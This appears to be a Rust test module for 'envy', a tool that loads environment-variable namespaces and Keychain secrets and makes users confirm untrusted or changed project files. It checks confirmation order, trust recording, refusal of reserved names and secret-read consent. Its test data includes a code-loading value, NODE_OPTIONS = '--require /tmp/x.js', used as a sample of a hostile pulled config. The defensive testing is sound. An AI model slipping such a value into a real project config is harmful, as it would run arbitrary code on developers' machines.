        activate_here(&ctx_of(cfg, store, &quiet), "dev", &ActiveState::default()).unwrap();
        assert!(quiet.asked().is_empty(), "{:?}", quiet.asked());
    }

    /// Runs `run` against a pulled (trusted, then changed) `dev` built from
    /// `t0`: declined, then with no terminal, then accepted. `answers` adds
    /// what the command asks after the confirmation; `check` inspects the
    /// accepted result.
    fn pulled_case(
        t0: &str,
        run: &dyn Fn(&Ctx) -> Result<()>,
        answers: &dyn Fn(ScriptedPrompter) -> ScriptedPrompter,
        check: &dyn Fn(&str),
    ) {
        let base = tempfile::tempdir().unwrap();
        let (cfg, store) = pulled(base.path(), t0);
        let pulled_text = format!("{t0}{HOSTILE}");
        let files = disk(base.path());
        let keys = store.snapshot();

        // Declined: nothing asked after it, nothing changed, no new record.
        let no = answers(ScriptedPrompter::new().with_confirm(false));
        let left = no.remaining() - 1;
        let err = run(&ctx_of(&cfg, &store, &no)).unwrap_err();
        assert_eq!(
            err.to_string(),
            "not changed: you did not trust namespace \"dev\"; nothing was changed"
        );
        assert_change_confirmation_first(&no, true);
        assert_eq!(no.asked().len(), 1);
        assert_eq!(no.remaining(), left);
        assert_eq!(disk(base.path()), files);
        assert_eq!(store.snapshot(), keys);
        assert!(!trusted(&cfg, &pulled_text));

        // No terminal: the same.
        assert!(run(&ctx_for(&cfg, &store, &NoTerminal)).is_err());
        assert_eq!(disk(base.path()), files);
        assert_eq!(store.snapshot(), keys);

        // Accepted: changed, and the result is trusted.
        let yes = answers(ScriptedPrompter::new().with_confirm(true));
        run(&ctx_of(&cfg, &store, &yes)).unwrap();
        assert_change_confirmation_first(&yes, true);
        assert_eq!(yes.remaining(), 0);
        let now = std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap();
        assert!(now.contains(HOSTILE.trim_end()), "{now}");
        check(&now);
        assert!(trusted(&cfg, &now));
        activates_quietly(&cfg, &store);
    }

    #[test]
    fn mutating_a_changed_project_file_confirms_first_set_vars() {
        pulled_case(
            T0,
            &|ctx| set_vars(ctx, "dev", &[pv("REGION", "us"), sec("NEW")]),
            &|p| p.with_secret("n-1"),
            &|now| assert!(now.contains("REGION = \"us\"") && now.contains("NEW = ")),
        );
    }

    #[test]
    fn mutating_a_changed_project_file_confirms_first_edit() {
        pulled_case(
            T0,
            &|ctx| {
                edit(ctx, "dev", &|path: &Path| {
                    let text = std::fs::read_to_string(path)?;
                    std::fs::write(path, text.replace("\"eu\"", "\"us\""))?;
                    Ok(())
                })
                .map(|_| ())
            },
            &|p| p,
            &|now| assert!(now.contains("REGION = \"us\""), "{now}"),
        );
    }

    #[test]
    fn mutating_a_changed_project_file_confirms_first_link() {
        pulled_case(T0, &|ctx| link::link(ctx, "dev", "aws"), &|p| p, &|now| {
            assert!(now.contains("link = \"aws\""), "{now}")
        });
    }

    #[test]
    fn mutating_a_changed_project_file_confirms_first_unlink() {
        pulled_case(LINKED_T0, &|ctx| link::unlink(ctx, "dev"), &|p| p, &|now| {
            assert!(!now.contains("link"), "{now}")
        });
    }

    #[test]
    fn an_untrusted_never_seen_file_is_confirmed_before_a_change() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        let no = ScriptedPrompter::new().with_confirm(false);
        assert!(set_vars(&ctx_of(&cfg, &store, &no), "dev", &[pv("REGION", "us")]).is_err());
        assert_change_confirmation_first(&no, false);
        assert_eq!(
            std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap(),
            T0
        );
        assert!(!base.path().join("user/trust").exists());

        let yes = ScriptedPrompter::new().with_confirm(true);
        set_vars(&ctx_of(&cfg, &store, &yes), "dev", &[pv("REGION", "us")]).unwrap();
        assert_change_confirmation_first(&yes, false);
        let now = std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap();
        assert_eq!(now, "[vars]\nREGION = \"us\"\nTOKEN = \"@keychain\"\n");
        assert!(trusted(&cfg, &now));
        activates_quietly(&cfg, &store);
    }

    #[test]
    fn an_already_trusted_file_is_changed_without_a_question_and_stays_trusted() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        record_trust(
            &ctx_of(&cfg, &store, &ScriptedPrompter::new()),
            &cfg.load("dev").unwrap(),
        )
        .unwrap();
        let quiet = ScriptedPrompter::new();
        set_vars(&ctx_of(&cfg, &store, &quiet), "dev", &[pv("REGION", "us")]).unwrap();
        assert!(quiet.asked().is_empty());
        activates_quietly(&cfg, &store);
    }

    #[test]
    fn a_failed_apply_records_no_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "NEW",
        };
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("n-1");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(set_vars(&ctx, "dev", &[sec("NEW")]).is_err());
        assert_eq!(prompt.remaining(), 0);
        assert_eq!(
            std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap(),
            T0
        );
        assert!(store.inner.snapshot().is_empty());
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn a_failed_edit_records_no_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "NEW",
        };
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("n-1");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let add = |path: &Path| {
            let text = std::fs::read_to_string(path)?;
            std::fs::write(path, format!("{text}NEW = \"@keychain\"\n"))?;
            Ok(())
        };
        assert!(edit(&ctx, "dev", &add).is_err());
        assert_eq!(prompt.remaining(), 0);
        assert_eq!(
            std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap(),
            T0
        );
        assert!(store.inner.snapshot().is_empty());
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn a_failed_link_records_no_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        std::fs::write(
            cfg.dir().join("other.toml"),
            "link = \"g\"\n[vars]\nREGION = \"x\"\nTOKEN = \"@keychain\"\nNEW = \"@keychain\"\n",
        )
        .unwrap();
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "NEW",
        };
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("n-1");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = format!("{:#}", link::link(&ctx, "dev", "g").unwrap_err());
        // It got as far as the Keychain write: every question was answered.
        assert_eq!(prompt.remaining(), 0, "{err}");
        assert!(err.contains("simulated Keychain failure"), "{err}");
        assert_eq!(
            std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap(),
            T0
        );
        assert!(store.inner.snapshot().is_empty());
        assert!(!base.path().join("user/trust").exists());
    }

    fn is_root() -> bool {
        crate::project::current_euid() == 0
    }

    #[test]
    fn a_failed_unlink_records_no_trust() {
        if is_root() {
            return;
        }
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", LINKED_T0);
        // The save cannot create its temp file in a read-only directory.
        std::fs::set_permissions(cfg.dir(), std::fs::Permissions::from_mode(0o500)).unwrap();
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let result = link::unlink(&ctx_of(&cfg, &store, &prompt), "dev");
        std::fs::set_permissions(cfg.dir(), std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(result.is_err());
        assert_eq!(prompt.remaining(), 0);
        assert_eq!(
            std::fs::read_to_string(cfg.dir().join("dev.toml")).unwrap(),
            LINKED_T0
        );
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn user_level_mutations_never_confirm() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"x\"\n")]);
        let store = MemoryStore::default();
        let none = ScriptedPrompter::new();
        let ctx = ctx_of(&cfg, &store, &none);
        set_vars(&ctx, "work", &[pv("A", "y")]).unwrap();
        edit(&ctx, "work", &|path: &Path| {
            std::fs::write(path, "[vars]\nA = \"z\"\n")?;
            Ok(())
        })
        .unwrap();
        link::link(&ctx, "work", "grp").unwrap();
        link::unlink(&ctx, "work").unwrap();
        assert!(none.asked().is_empty());
        assert_eq!(read(&dir, "work"), "[vars]\nA = \"z\"\n");
        assert!(!dir.path().join("trust").exists());
    }

    #[test]
    fn a_change_trusts_only_the_namespace_the_user_changed() {
        let base = tempfile::tempdir().unwrap();
        let cfg = project_cfg(base.path(), "acme/api");
        std::fs::create_dir_all(cfg.dir()).unwrap();
        let a = "link = \"aws\"\n[vars]\nNODE_OPTIONS = \"\"\n";
        let b = "link = \"aws\"\n[vars]\nNODE_OPTIONS = \"--require /tmp/x.js\"\n";
        std::fs::write(cfg.dir().join("a.toml"), a).unwrap();
        std::fs::write(cfg.dir().join("b.toml"), b).unwrap();
        let store = MemoryStore::default();
        record_trust(
            &ctx_of(&cfg, &store, &ScriptedPrompter::new()),
            &cfg.load("a").unwrap(),
        )
        .unwrap();
        // `a` is trusted, so the only question is b's value for NEW.
        let prompt = ScriptedPrompter::new().with_plain("2");
        set_vars(&ctx_of(&cfg, &store, &prompt), "a", &[pv("NEW", "1")]).unwrap();
        assert_eq!(prompt.remaining(), 0);
        assert!(matches!(&prompt.asked()[..], [Asked::Plain { .. }]));
        let b_now = cfg.load("b").unwrap().text();
        assert!(b_now.contains("NEW = \"2\""), "{b_now}");
        // `a` loads with no question; `b` was never confirmed, so it asks.
        let quiet = ScriptedPrompter::new();
        activate_here(&ctx_of(&cfg, &store, &quiet), "a", &ActiveState::default()).unwrap();
        assert!(quiet.asked().is_empty());
        let ask = ScriptedPrompter::new().with_confirm(false);
        assert!(activate_here(&ctx_of(&cfg, &store, &ask), "b", &ActiveState::default()).is_err());
        assert!(
            matches!(&ask.asked()[..], [Asked::Confirm(t)] if t.contains("--require /tmp/x.js")),
            "{:?}",
            ask.asked()
        );
    }

    #[test]
    fn confirmation_precedes_the_editor() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        // Declined: the editor never runs.
        let no = ScriptedPrompter::new().with_confirm(false);
        assert!(edit(&ctx_of(&cfg, &store, &no), "dev", &never_runs).is_err());
        assert_eq!(no.asked().len(), 1);
        // Accepted: the editor runs only once the question was answered.
        let yes = ScriptedPrompter::new().with_confirm(true);
        let answered_before_editor = std::cell::Cell::new(false);
        edit(&ctx_of(&cfg, &store, &yes), "dev", &|_: &Path| {
            answered_before_editor.set(yes.asked().len() == 1 && yes.remaining() == 0);
            Ok(())
        })
        .unwrap();
        assert!(answered_before_editor.get());
        // Nothing was edited, but the confirmed file is now trusted.
        assert!(trusted(&cfg, T0));
    }

    #[test]
    fn trust_errors_name_the_purpose() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let file = cfg.load("dev").unwrap();
        let store = MemoryStore::default();
        let cases = [
            (
                Purpose::Load,
                "not loaded: you did not trust namespace \"dev\"; nothing was changed",
                "project namespace \"dev\" is not trusted yet and needs a terminal to review it \
                 (run envy dev in a terminal); nothing was changed",
            ),
            (
                Purpose::Copy,
                "not copied: you did not trust namespace \"dev\"; nothing was copied",
                "project namespace \"dev\" is not trusted yet and needs a terminal to review it \
                 (run the command again in a terminal); nothing was copied",
            ),
            (
                Purpose::Change,
                "not changed: you did not trust namespace \"dev\"; nothing was changed",
                "project namespace \"dev\" is not trusted yet and needs a terminal to review it \
                 (run the command again in a terminal to review the namespace first); \
                 nothing was changed",
            ),
        ];
        for (purpose, declined, no_terminal) in cases {
            let no = ScriptedPrompter::new().with_confirm(false);
            let err = check_trust_for(&ctx_of(&cfg, &store, &no), &file, purpose).unwrap_err();
            assert_eq!(err.to_string(), declined);
            let err =
                check_trust_for(&ctx_for(&cfg, &store, &NoTerminal), &file, purpose).unwrap_err();
            assert_eq!(err.to_string(), no_terminal);
        }
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn create_rejects_a_mismatched_source_pair() {
        let base = tempfile::tempdir().unwrap();
        let source = checkout(base.path(), "a", SRC);
        let src_file = source.load("dev").unwrap();
        let user = Config::new(base.path().join("u"));
        let other = project_cfg(&base.path().join("b"), "acme/web");
        let store = MemoryStore::default();
        for (cfg, label) in [(&user, "user-level config"), (&other, "other project")] {
            // Would succeed if the pair were trusted as given.
            let p = ScriptedPrompter::new().with_secret("x");
            let err = create(
                &ctx_of(&user, &store, &p),
                "new",
                Some((cfg, &src_file)),
                None,
            )
            .unwrap_err();
            assert!(
                err.to_string()
                    .contains("was not loaded from the given config"),
                "{label}: {err:#}"
            );
            assert!(p.asked().is_empty(), "{label}");
            assert!(!user.present("new").unwrap(), "{label}");
        }
        assert!(store.snapshot().is_empty());
    }

    #[test]
    fn project_set_and_edit_labels_name_the_project() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", T0);
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        record_trust(
            &ctx_of(&cfg, &store, &ScriptedPrompter::new()),
            &cfg.load("dev").unwrap(),
        )
        .unwrap();
        let shown = "dev (project acme/api)";
        let p = ScriptedPrompter::new().with_plain("us").with_secret("n-1");
        set_vars(
            &ctx_of(&cfg, &store, &p),
            "dev",
            &[pl("REGION"), sec("NEW")],
        )
        .unwrap();
        assert_eq!(
            p.asked(),
            vec![
                Asked::Plain {
                    label: plain_label("REGION", shown),
                    default: Some("eu".into()),
                },
                Asked::Secret(secret_label("NEW", shown)),
            ]
        );
        let p = ScriptedPrompter::new().with_secret("m-1");
        edit(&ctx_of(&cfg, &store, &p), "dev", &|path: &Path| {
            let text = std::fs::read_to_string(path)?;
            std::fs::write(path, format!("{text}MORE = \"@keychain\"\n"))?;
            Ok(())
        })
        .unwrap();
        assert_eq!(p.asked(), vec![Asked::Secret(secret_label("MORE", shown))]);
    }

    // ---- final fix wave ----

    #[test]
    fn envy_prefixed_names_are_refused_at_every_entry_point() {
        let before = "[vars]\nA = \"1\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = ctx_of(&cfg, &store, &prompt);
        let prefix = |e: anyhow::Error| {
            let m = format!("{e:#}");
            assert!(m.contains("ENVY_ prefix"), "{m}");
        };
        for name in ["ENVY_CONFIG_DIR", "ENVY_EVAL", "ENVY_ACTIVE", "ENVY_X"] {
            // --plain / --secret
            prefix(set_vars(&ctx, "work", &[pv(name, "/x")]).unwrap_err());
            prefix(set_vars(&ctx, "work", &[sec(name)]).unwrap_err());
            // --edit
            let text = format!("[vars]\nA = \"1\"\n{name} = \"1\"\n");
            let seen = RefCell::new(Seen::default());
            prefix(edit(&ctx, "work", &editor(&seen, |_| text.clone())).unwrap_err());
            assert_eq!(read(&dir, "work"), before);
            // An existing file: loading it (activation, --like source) fails.
            std::fs::write(dir.path().join("evil.toml"), &text).unwrap();
            prefix(cfg.load("evil").unwrap_err());
            prefix(activate_here(&ctx, "evil", &ActiveState::default()).unwrap_err());
            // A link-group member with such a name stops the propagation.
            std::fs::write(
                dir.path().join("evil.toml"),
                format!("link = \"g\"\n{text}"),
            )
            .unwrap();
            prefix(link::link(&ctx, "work", "g").unwrap_err());
            assert_eq!(read(&dir, "work"), before);
            std::fs::remove_file(dir.path().join("evil.toml")).unwrap();
        }
        assert!(prompt.asked().is_empty());
        assert!(snap(&store).is_empty());
        // Lowercase is not the reserved prefix.
        set_vars(&ctx, "work", &[pv("envy_x", "1")]).unwrap();
        let out = activate_here(&ctx, "work", &ActiveState::default()).unwrap();
        assert!(out.ends_with("export envy_x='1'\n"), "{out}");
    }

    /// A store whose `get` (which reads a secret VALUE, and on the real
    /// Keychain may show macOS's access dialog) must not be called.
    struct NoReads(MemoryStore);

    impl SecretStore for NoReads {
        fn get(&self, _: &str, _: &str) -> Result<Option<Secret>> {
            panic!("a secret value was read before the user consented")
        }
        fn contains(&self, ns: &str, name: &str) -> Result<bool> {
            self.0.contains(ns, name)
        }
        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
            self.0.set(ns, name, value)
        }
        fn delete(&self, ns: &str, name: &str) -> Result<()> {
            self.0.delete(ns, name)
        }
    }

    #[test]
    fn the_confirmation_checks_existence_without_reading_values() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = NoReads(MemoryStore::default());
        store
            .0
            .set(PKEY, "TOKEN", &Secret::new("t".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(activate_here(&ctx, "dev", &ActiveState::default()).is_err());
        let Asked::Confirm(q) = &prompt.asked()[0] else {
            panic!()
        };
        assert!(q.contains("secret TOKEN: already in your Keychain"), "{q}");
        assert!(
            q.contains("secret API_KEY: you will be asked for it"),
            "{q}"
        );
        // The caution: TOKEN was saved from another checkout.
        assert!(
            q.contains("Some of these secrets were saved for acme/api from another checkout"),
            "{q}"
        );
    }

    #[test]
    fn the_missing_secret_scan_reads_no_values() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        assert!(!trusted(&cfg, PROJ));
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), "dev", &cfg.load("dev").unwrap().text())
            .unwrap();
        let store = NoReads(MemoryStore::default());
        store
            .0
            .set(PKEY, "TOKEN", &Secret::new("t".into()))
            .unwrap();
        // No answer for API_KEY: the command stops at that prompt.
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(activate_here(&ctx, "dev", &ActiveState::default()).is_err());
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret(secret_label(
                "API_KEY",
                "dev (project acme/api)"
            ))]
        );
    }

    #[test]
    fn a_changed_file_at_the_same_checkout_gets_no_caution() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), "dev", "old text")
            .unwrap();
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        assert!(
            activate_here(
                &ctx_of(&cfg, &store, &prompt),
                "dev",
                &ActiveState::default()
            )
            .is_err()
        );
        let Asked::Confirm(q) = &prompt.asked()[0] else {
            panic!()
        };
        assert!(q.contains("has changed since you last trusted it"), "{q}");
        assert!(!q.contains("from another checkout"), "{q}");
    }

    // ---- stacking ----

    use crate::stack::Entry as StackEntry;

    /// A user level and one project level (`proj/.envy`, identity acme/api)
    /// as seen from inside `proj`.
    struct StackLevels {
        _tmp: tempfile::TempDir,
        user: Config,
        proj: Config,
        levels: Levels,
    }

    fn stack_levels(user_files: &[(&str, &str)], proj_files: &[(&str, &str)]) -> StackLevels {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let user_dir = base.join("user");
        let root = base.join("proj");
        for (dir, files) in [
            (user_dir.clone(), user_files),
            (root.join(".envy"), proj_files),
        ] {
            std::fs::create_dir_all(&dir).unwrap();
            for (name, text) in files {
                std::fs::write(dir.join(format!("{name}.toml")), text).unwrap();
            }
        }
        let user = Config::new(user_dir.clone());
        let proj = Config::project(root.join(".envy"), root, "acme/api".into(), user_dir);
        let levels = Levels::with_projects(vec![proj.clone()], user.clone());
        StackLevels {
            _tmp: tmp,
            user,
            proj,
            levels,
        }
    }

    /// Records the project file `ns` as trusted, as it is now.
    fn trust_now(cfg: &Config, ns: &str) {
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), ns, &cfg.load(ns).unwrap().text())
            .unwrap();
    }

    /// A stack of `(name, source, vars)`, oldest first.
    fn stack_of(entries: &[(&str, &str, &[&str])]) -> ActiveState {
        ActiveState {
            entries: entries
                .iter()
                .map(|(ns, source, vars)| StackEntry {
                    namespace: ns.to_string(),
                    source: Some(source.to_string()),
                    vars: vars.iter().map(|v| v.to_string()).collect(),
                })
                .collect(),
            extra_vars: vec![],
        }
    }

    fn store_of(items: &[(&str, &str, &str)]) -> MemoryStore {
        let store = MemoryStore::default();
        for (key, name, value) in items {
            store
                .set(key, name, &Secret::new(value.to_string()))
                .unwrap();
        }
        store
    }

    fn activate_in(
        s: &StackLevels,
        cfg: &Config,
        store: &dyn SecretStore,
        ns: &str,
        prev: &ActiveState,
    ) -> Result<Activation> {
        // Nothing here may prompt: every secret is already in the store.
        activate(&ctx_for(cfg, store, &NoTerminal), &s.levels, ns, prev)
    }

    const LINKED_WORK: &str = "link = \"aws\"\n\n[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\n";
    const LINKED_PERSONAL: &str =
        "link = \"aws\"\n\n[vars]\nREGION = \"us\"\nTOKEN = \"@keychain\"\n";

    #[test]
    fn activating_a_second_namespace_keeps_the_first() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nA = \"1\"\n"),
                ("work", "[vars]\nB = \"@keychain\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("work", "B", "b-secret")]);
        let prev = stack_of(&[("base", "user", &["A"])]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["A"]), ("work", "user", &["B"])]);
        assert_eq!(
            out.stdout,
            format!("{}export B='b-secret'\n", next.state_exports())
        );
        assert!(out.notes.is_empty(), "{:?}", out.notes);
    }

    #[test]
    fn activating_a_linked_namespace_replaces_the_active_one() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nA = \"1\"\n"),
                ("work", LINKED_WORK),
                ("personal", LINKED_PERSONAL),
            ],
            &[],
        );
        let store = store_of(&[("work", "TOKEN", "tw"), ("personal", "TOKEN", "tp")]);
        let prev = stack_of(&[
            ("base", "user", &["A"]),
            ("work", "user", &["REGION", "TOKEN"]),
        ]);
        let out = activate_in(&s, &s.user, &store, "personal", &prev).unwrap();
        let next = stack_of(&[
            ("base", "user", &["A"]),
            ("personal", "user", &["REGION", "TOKEN"]),
        ]);
        assert_eq!(
            out.stdout,
            format!(
                "{}export REGION='us'\nexport TOKEN='tp'\n",
                next.state_exports()
            )
        );
        // A replacement is not a collision.
        assert!(out.notes.is_empty(), "{:?}", out.notes);
    }

    #[test]
    fn an_unlinked_namespace_is_added_not_replaced() {
        let s = stack_levels(
            &[
                ("work", LINKED_WORK),
                ("personal", LINKED_PERSONAL),
                ("tools", "[vars]\nT = \"t\"\n"),
                ("gcp", "link = \"gcp\"\n\n[vars]\nG = \"g\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("work", "TOKEN", "tw"), ("personal", "TOKEN", "tp")]);
        let work = ("work", "user", &["REGION", "TOKEN"][..]);
        // No link, or another group: added on top.
        for (ns, vars) in [("tools", &["T"][..]), ("gcp", &["G"])] {
            let out = activate_in(&s, &s.user, &store, ns, &stack_of(&[work])).unwrap();
            let next = stack_of(&[work, (ns, "user", vars)]);
            assert!(
                out.stdout.starts_with(&next.state_exports()),
                "{}",
                out.stdout
            );
        }
        // A linked member recorded from another level is never re-read, so
        // never replaced: personal is added and wins both names.
        let other = ("work", "/elsewhere/.envy", &["REGION", "TOKEN"][..]);
        let out = activate_in(&s, &s.user, &store, "personal", &stack_of(&[other])).unwrap();
        let next = stack_of(&[other, ("personal", "user", &["REGION", "TOKEN"])]);
        assert_eq!(
            out.stdout,
            format!(
                "{}export REGION='us'\nexport TOKEN='tp'\n",
                next.state_exports()
            )
        );
        assert_eq!(out.notes.len(), 2, "{:?}", out.notes);
        // A recorded entry whose file is gone cannot be linked either.
        let gone = ("old", "user", &["REGION"][..]);
        let out = activate_in(&s, &s.user, &store, "personal", &stack_of(&[gone])).unwrap();
        assert!(
            out.stdout.contains("old\u{1f}user\u{1f}REGION"),
            "{}",
            out.stdout
        );
    }

    #[test]
    fn a_collision_prints_a_warning_with_names_only() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nS = \"@keychain\"\nA = \"zq-plain-a\"\n"),
                ("work", "[vars]\nS = \"@keychain\"\nA = \"zq-plain-b\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("base", "S", "zq-base-s"), ("work", "S", "zq-work-s")]);
        let prev = stack_of(&[("base", "user", &["S", "A"])]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        assert_eq!(
            out.notes,
            [
                "warning: S is set by both \"base\" and \"work\"; \"work\" wins (it was activated last)",
                "warning: A is set by both \"base\" and \"work\"; \"work\" wins (it was activated last)",
            ]
        );
        assert!(!out.notes.concat().contains("zq-"), "{:?}", out.notes);
        assert!(
            out.stdout
                .ends_with("export S='zq-work-s'\nexport A='zq-plain-b'\n"),
            "{}",
            out.stdout
        );
    }

    #[test]
    fn reactivating_refreshes_and_moves_to_the_top() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nA = \"1\"\n"),
                ("work", "[vars]\nB = \"@keychain\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("work", "B", "new-b")]);
        let prev = stack_of(&[("work", "user", &["B"]), ("base", "user", &["A"])]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["A"]), ("work", "user", &["B"])]);
        // B is exported again: its value may have changed.
        assert_eq!(
            out.stdout,
            format!("{}export B='new-b'\n", next.state_exports())
        );
        assert!(out.notes.is_empty(), "{:?}", out.notes);
    }

    #[test]
    fn a_same_named_namespace_at_the_other_level_replaces_the_entry() {
        let s = stack_levels(
            &[("dev", "[vars]\nA = \"u\"\nU = \"u\"\n")],
            &[("dev", "[vars]\nA = \"p\"\nP = \"@keychain\"\n")],
        );
        trust_now(&s.proj, "dev");
        let store = store_of(&[("project/acme/api/dev", "P", "pp")]);
        let here = label(&s.proj);
        // User dev active; the project dev replaces it.
        let prev = stack_of(&[("dev", "user", &["A", "U"])]);
        let out = activate_in(&s, &s.proj, &store, "dev", &prev).unwrap();
        let next = stack_of(&[("dev", &here, &["A", "P"])]);
        assert_eq!(
            out.stdout,
            format!(
                "unset U\n{}export A='p'\nexport P='pp'\n",
                next.state_exports()
            )
        );
        assert!(out.notes.is_empty(), "{:?}", out.notes);
        // And back (`--user`).
        let out = activate_in(&s, &s.user, &store, "dev", &next).unwrap();
        let back = stack_of(&[("dev", "user", &["A", "U"])]);
        assert_eq!(
            out.stdout,
            format!(
                "unset P\n{}export A='u'\nexport U='u'\n",
                back.state_exports()
            )
        );
    }

    #[test]
    fn a_replaced_entrys_shadowed_var_is_restored_from_the_lower_entry() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nX = \"base-x\"\nK = \"@keychain\"\n"),
                ("work", "[vars]\nW = \"w\"\n"),
                ("aws1", "link = \"aws\"\n\n[vars]\nR = \"1\"\n"),
                ("aws2", "link = \"aws\"\n\n[vars]\nR = \"2\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("base", "K", "base-k")]);
        // work used to define X and K too; refreshed, it no longer does.
        let prev = stack_of(&[
            ("base", "user", &["X", "K"]),
            ("work", "user", &["X", "K", "W"]),
        ]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["X", "K"]), ("work", "user", &["W"])]);
        assert_eq!(
            out.stdout,
            format!(
                "{}export X='base-x'\nexport K='base-k'\nexport W='w'\n",
                next.state_exports()
            )
        );
        assert!(out.notes.is_empty(), "{:?}", out.notes);

        // A linked replacement that uncovers a lower owner.
        let prev = stack_of(&[("base", "user", &["X"]), ("aws1", "user", &["R", "X"])]);
        let out = activate_in(&s, &s.user, &store, "aws2", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["X"]), ("aws2", "user", &["R"])]);
        assert_eq!(
            out.stdout,
            format!("{}export X='base-x'\nexport R='2'\n", next.state_exports())
        );

        // A lower secret no longer in the Keychain is left unset, with a note.
        store.delete("base", "K").unwrap();
        let prev = stack_of(&[("base", "user", &["K"]), ("work", "user", &["K", "W"])]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["K"]), ("work", "user", &["W"])]);
        assert_eq!(
            out.stdout,
            format!("unset K\n{}export W='w'\n", next.state_exports())
        );
        assert_eq!(
            out.notes,
            [
                "note: left unset: K (not in the Keychain for namespace \"base\"; run envy base to enter missing secrets)"
            ]
        );
    }

    #[test]
    fn restore_skips_a_project_file_changed_since_confirmed_and_says_so() {
        let s = stack_levels(
            &[("work", "[vars]\nW = \"w\"\n")],
            &[("base", "[vars]\nX = \"zq-confirmed\"\n")],
        );
        trust_now(&s.proj, "base");
        let store = MemoryStore::default();
        let here = label(&s.proj);
        let prev = stack_of(&[
            ("base", here.as_str(), &["X"]),
            ("work", "user", &["X", "W"]),
        ]);
        let next = stack_of(&[("base", here.as_str(), &["X"]), ("work", "user", &["W"])]);
        // Trusted as it is: restored.
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        assert_eq!(
            out.stdout,
            format!(
                "{}export X='zq-confirmed'\nexport W='w'\n",
                next.state_exports()
            )
        );
        // Changed after it was confirmed: not read, left unset, and said so.
        std::fs::write(
            s.proj.dir().join("base.toml"),
            "[vars]\nX = \"zq-pulled\"\n",
        )
        .unwrap();
